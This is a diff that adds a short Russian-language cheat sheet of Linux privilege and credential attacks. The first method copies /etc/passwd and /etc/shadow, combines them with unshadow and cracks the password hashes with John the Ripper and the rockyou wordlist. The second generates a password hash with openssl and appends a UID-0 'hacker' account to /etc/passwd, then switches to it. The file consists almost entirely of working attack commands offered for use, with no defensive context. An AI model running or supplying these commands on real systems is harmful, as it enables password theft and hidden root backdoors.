@@ -1,0 +1,32 @@
+## 1 Способ
+# Копируем нужные файлы (требуются root права через любую утилиту nano и тд), главное чтобы был доступ к /etc/shadow
+sudo cp /etc/passwd /tmp/passwd.txt
+sudo cp /etc/shadow /tmp/shadow.txt
+
+# Сделаем unshadow
+
+unshadow /tmp/passwd.txt /tmp/shadow.txt > /tmp/passwords.txt
+
+# Используем John the Ripper для взлома паролей
+
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/passwords.txt
+
+#
+В одну строку:
+    sudo unshadow /etc/passwd /etc/shadow > passwords.txt && john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+#
+
+##2 Способ
+
+# Создадим хэш пароля
+openssl passwd -1 -salt 123456 password
+
+# Добавим в etc/passwd
+
+hacker:хэш:0:0:root:/root:/bin/bash
+
+# Сменим пользователя на hacker
+
+su hacker
+
+
